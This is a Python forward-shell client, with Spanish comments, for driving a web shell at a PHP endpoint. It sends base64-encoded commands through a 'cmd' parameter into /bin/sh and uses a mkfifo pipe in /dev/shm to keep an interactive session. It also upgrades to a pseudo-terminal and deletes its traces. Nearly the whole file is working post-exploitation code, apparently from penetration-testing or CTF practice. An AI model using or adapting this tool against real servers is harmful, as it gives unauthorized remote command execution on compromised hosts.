#!/usr/bin/env python

import time
from base64 import b64encode
from random import randrange

import requests
from termcolor import colored


class ForwardShell:

    def __init__(self) -> None:
        session = randrange(1000, 9999)
        storage_path = "/dev/shm/"
        self.main_url = "http://localhost/index.php"
        self.stdin = f"{storage_path}{session}.input"
        self.stdout = f"{storage_path}{session}.output"
        self.is_seudo_terminal = False

    def run_command(self, command):
        command = b64encode(command.encode()).decode()
        data = {"cmd": f"echo {command} | base64 --decode | /bin/sh 2>&1"}

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass

        return None

    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()
        data = {"cmd": f"echo {command} | base64 --decode > {self.stdin}"}
        requests.get(self.main_url, params=data)

    def read_stdout(self):
        output_command = ""
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)
        return output_command

    # NOTE: mkfifo creacion
    # mkfifo input; tail -f input | /bin/sh > output
    def setup_shell(self):
        command = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout}"
        self.run_command(command)

    def remove_data(self):
        remove_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_command)

    def clear_stdout(self):
        clear_stdout_command = f'echo "" > {self.stdout}'
        self.run_command(clear_stdout_command)

    def run(self):

        # INFO: Configura la shell para crear un mkfifo espera 5 seg y luego solo escribimos sobre el .input
        self.setup_shell()

        # INFO: Bucle para escribir repetidamente sobre stdin
        while True:

            command = input(colored(">>", "yellow"))
            # HACK: Sin el + '\n' el comando no funciona

            if "script /dev/null -c bash" in command:
                print(colored(f"\n[+] Se ha iniciado una pseudo-terminal\n", "blue"))
                self.is_seudo_terminal = True

            self.write_stdin(command + "\n")
            output_command = self.read_stdout()

            if command.strip() == "exit" and self.is_seudo_terminal == True:
                self.is_seudo_terminal = False
                print(colored(f"[!] Se ha salido de la pseudo-terminal", "red"))
                self.clear_stdout()
                continue
            cleared_output = ""
            if self.is_seudo_terminal and output_command:
                lines = output_command.split("\n")
                if len(lines) == 3:
                    cleared_output = "\n".join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_output = "\n".join([lines[-1]] + lines[:1] + lines[2:-1])

                print("\n" + cleared_output + "\n")
            else:
                print(colored(output_command, "blue"))
            self.clear_stdout()
